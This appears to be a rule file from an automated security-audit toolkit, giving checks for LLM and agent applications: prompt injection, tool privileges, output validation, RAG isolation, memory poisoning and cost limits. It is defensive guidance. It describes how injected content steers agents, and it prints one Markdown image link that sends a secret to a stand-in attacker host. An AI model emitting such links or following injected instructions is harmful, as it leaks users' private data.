---
id: RG-LLM
title: LLM and agent application security
auditor: ai
discovery: LLM SDKs or model APIs, agent frameworks, vector stores, or prompt templates are present.
rules:
  RG-LLM-001: Prompt injection reaches privileged behavior (direct or indirect) [LLM01, ASI01]
  RG-LLM-002: Lethal trifecta in one agent context (private data + untrusted content + external communication) [LLM01, ASI01, ASI02]
  RG-LLM-003: Improper output handling (model output into shell, SQL, HTML, paths, eval, or code execution) [LLM05, ASI05]
  RG-LLM-004: Excessive agency (over-privileged tools or no human approval for high-impact actions) [LLM06, ASI02, ASI03]
  RG-LLM-005: Sensitive information disclosure or secrets in prompts [LLM02, LLM07]
  RG-LLM-006: RAG or vector store without access control or tenant isolation [LLM08]
  RG-LLM-007: Memory or context poisoning (persistent memory, shared embeddings, conversation stores) [LLM04, ASI06]
  RG-LLM-008: Unbounded consumption (no token, cost, rate, or recursion limits) [LLM10, ASI08]
  RG-LLM-009: Insecure model or dataset supply chain (unpinned or unverified models, pickle weights) [LLM03, LLM04]
  RG-LLM-010: Unverified model output used for consequential decisions without grounding or review [LLM09, ASI09]
---

# LLM and Agent Application Security

## R: Risk First
**Goal**: Prevent attackers from steering a model or agent into leaking data, misusing tools, executing code or burning budget.
**Risk**: Data exfiltration, unauthorized actions through tools, remote code execution, cross-tenant data exposure, persistent manipulation, runaway cost.
**Context**: Applications that call models (OpenAI, Anthropic, Google, Bedrock, Azure, local models), use agent frameworks (LangChain, LangGraph, LlamaIndex, CrewAI, AutoGen, OpenAI Agents SDK, Vercel AI SDK, Mastra), RAG pipelines or long-term memory. Maps to the OWASP Top 10 for LLM Applications (2025) and the OWASP Top 10 for Agentic Applications (2026).

## A: Attached Constraints
- NEVER rely on prompt wording ("ignore instructions in documents") or phrase blocklists as a security control. Models cannot reliably separate instructions from data.
- NEVER let one agent context combine private data, untrusted content and an external communication channel without a hard break (human approval, or a quarantined model with no tools).
- ALWAYS treat model output as untrusted input before it reaches a shell, SQL, HTML, a file path, `eval`, a code interpreter or another agent.
- ALWAYS authorize tool calls against the end user's permissions, not the agent's service identity.
- ALWAYS require human approval for irreversible or high-impact actions (payments, deletes, sending messages externally, permission changes, deploys).
- NEVER put secrets in system prompts or model context.
- ALWAYS enforce access control and tenant filters inside retrieval, not after generation.
- ALWAYS cap tokens, cost, request rate, tool-call count and agent loop depth.

## I: Isolation
- **Trust boundaries**: user ↔ model; retrieved or fetched content ↔ model; model ↔ tools; agent ↔ agent; session ↔ persistent memory; tenant ↔ tenant in shared indexes.
- **Untrusted inputs**: user prompts, uploaded documents, web pages, emails, tickets, code comments, tool and MCP responses, retrieved chunks, messages from other agents, and the model's own output.
- **Least privilege**:
  - Give each agent the smallest tool set for its task; separate read tools from write tools.
  - Use per-user, short-lived, narrowly scoped credentials for tools; never a shared admin key.
  - Run code-execution tools in sandboxes (containers, gVisor, Firecracker, WASM) with no network or secrets by default.
- **Containment patterns**:
  - *Dual-model / quarantine*: a privileged planner never sees raw untrusted content; a quarantined model with no tools processes it and returns structured, validated data (for example CaMeL-style designs).
  - *Plan-then-execute*: fix the tool plan before reading untrusted content, so injected text cannot add new actions.
  - *Egress control*: allowlist the domains tools can contact; strip or proxy URLs and images in rendered output to block exfiltration through Markdown links.

## L: Local Defaults

**When an agent reads external content** (web, email, files, tickets):
- Run that step in a context without write or send tools, or require approval for any subsequent write or send.
- Return structured output (JSON schema) instead of free text to the privileged context.

**When model output drives actions**:
- Validate against a schema; allowlist tool names and argument values; parameterize SQL; pass argument arrays to processes; sanitize HTML and Markdown before rendering; never `eval` model output.

**When rendering model output in a UI**:
- Sanitize HTML; do not auto-load remote images or follow links from model output (common exfiltration path: `![x](https://attacker/?d=<secret>)`).

**When building RAG**:
- Store tenant and ACL metadata with each chunk; filter by the caller's identity in the vector query; re-check access on returned documents.
- Track provenance of ingested content; quarantine or review content from untrusted sources before indexing.

**When adding long-term memory**:
- Scope memory per user; record the source of each memory; do not let untrusted content write memory directly; allow users to inspect and delete memory.

**When configuring cost limits**:
- Set `max_tokens`, per-user rate limits and budgets, timeouts, maximum tool calls per turn and maximum agent recursion depth; alert on spikes.

**When loading models**:
- Pin model versions or hashes; prefer `safetensors`; never load pickle-based weights from untrusted sources (see `deserialization.md`).

**When outputs inform decisions** (medical, legal, financial, security):
- Ground answers in cited sources, show uncertainty, and keep a human decision-maker in the loop.

## G: Generative Path Checks
1. Which agents or model calls can see untrusted content, and what tools do they hold at that moment?
2. Does any single context combine private data, untrusted content and an external channel (lethal trifecta)?
3. Is every model output validated before reaching a shell, SQL, HTML, file path, interpreter or another agent?
4. Are tools authorized per end user, scoped, and split into read and write?
5. Do high-impact actions require human approval that shows the exact action?
6. Are secrets kept out of prompts and context?
7. Do retrieval queries enforce tenant and ACL filters?
8. Can untrusted content write to persistent memory or shared indexes?
9. Are token, cost, rate, tool-call and recursion limits enforced?
10. Are models and datasets pinned and loaded in safe formats?

## U: Uncertainty Disclosure
- **Safe default**: assume any content the agent reads can contain instructions, and assume a successful injection gets every tool the agent holds.
- **Escalate when**: an agent with write, payment, messaging or shell tools processes external content without approval gates; or a code-execution tool lacks a sandbox.
- State the blast radius explicitly (see `severity.md`). Lethal-trifecta findings are HIGH at minimum and CRITICAL when the agent acts autonomously.

## A: Auditability
- **Log**: every tool call (tool, arguments hash, user, decision, approver), approvals and denials, retrieval queries with tenant ID, memory writes with source, budget and rate-limit hits.
- **Never log**: full prompts or completions containing user PII or secrets, unless redacted and access-controlled.
- **Comment**: at each tool definition, state its privilege level and whether it requires approval.

## R: Review
1. Did a new tool give an agent write, send or execute capability?
2. Did a new data source (web fetch, email, uploads) enter an agent that already holds sensitive tools?
3. Did a memory or RAG feature start accepting content from untrusted sources?
4. Are cost and loop limits still in place after framework upgrades?

**Core principle**: Prompt injection is not solved, so design for it. Contain what a manipulated model can reach: separate untrusted content from privileged tools, validate every output, authorize every tool call as the end user, gate high-impact actions behind humans, and cap spend.

## S: Spend
- Runs in: `railguards-auditor-ai`.
- Gate: recon's LLM/agent discovery check is positive.
- Scanners first: Semgrep rules for LLM output to `eval`/`exec`/shell if available; otherwise grep model call sites (`chat.completions`, `messages.create`, `generateText`, `streamText`, `invoke(`, `Runnable`, `Agent(`, `tool(`, `@tool`).
- Read: tool definitions and their implementations, prompt assembly code, retrieval queries, memory writers, and output consumers. Build a small table of agent → tools → content sources first; it drives every check above.
- Skip: provider SDK internals and prompt text that is purely stylistic.
